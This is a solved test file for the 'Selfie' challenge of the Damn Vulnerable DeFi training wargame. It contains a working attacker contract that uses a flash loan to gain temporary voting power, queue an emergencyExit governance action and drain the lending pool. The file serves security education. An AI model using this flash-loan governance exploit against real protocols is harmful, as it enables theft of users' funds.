// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        /**
         * VULNERABILITY EXPLANATION:
         * The SelfiePool's emergencyExit function can drain all funds but is protected by onlyGovernance.
         * The governance requires >50% voting power to queue actions, with a 2-day execution delay.
         *
         * The vulnerability is that voting power is based on token holdings at a point in time.
         * Using a flash loan, we can temporarily hold >50% of tokens, delegate votes to ourselves,
         * and queue a malicious governance action - all before repaying the loan.
         *
         * EXPLOIT STRATEGY:
         * 1. Deploy attacker contract that implements IERC3156FlashBorrower
         * 2. Flash loan all tokens from the pool
         * 3. During callback: delegate votes to ourselves and queue emergencyExit(recovery)
         * 4. Repay the flash loan
         * 5. Wait 2 days (time warp in test)
         * 6. Execute the queued governance action to drain the pool
         */

        // Deploy attacker and execute flash loan + governance queue
        SelfieAttacker attacker = new SelfieAttacker(pool, governance, token, recovery);
        uint256 actionId = attacker.attack();

        // Fast forward 2 days to pass governance delay
        vm.warp(block.timestamp + 2 days);

        // Execute the queued action to drain the pool
        governance.executeAction(actionId);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

/**
 * @notice Attacker contract that uses flash loan to gain governance voting power
 */
contract SelfieAttacker is IERC3156FlashBorrower {
    SelfiePool private pool;
    SimpleGovernance private governance;
    DamnValuableVotes private token;
    address private recovery;
    uint256 public actionId;

    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(
        SelfiePool _pool,
        SimpleGovernance _governance,
        DamnValuableVotes _token,
        address _recovery
    ) {
        pool = _pool;
        governance = _governance;
        token = _token;
        recovery = _recovery;
    }

    function attack() external returns (uint256) {
        // Flash loan all tokens from the pool
        uint256 amount = token.balanceOf(address(pool));
        pool.flashLoan(this, address(token), amount, "");
        return actionId;
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        // Delegate votes to ourselves to gain voting power
        token.delegate(address(this));

        // Queue governance action to call emergencyExit(recovery)
        bytes memory data = abi.encodeCall(SelfiePool.emergencyExit, (recovery));
        actionId = governance.queueAction(address(pool), 0, data);

        // Approve pool to take back the tokens
        token.approve(address(pool), amount);

        return CALLBACK_SUCCESS;
    }
}
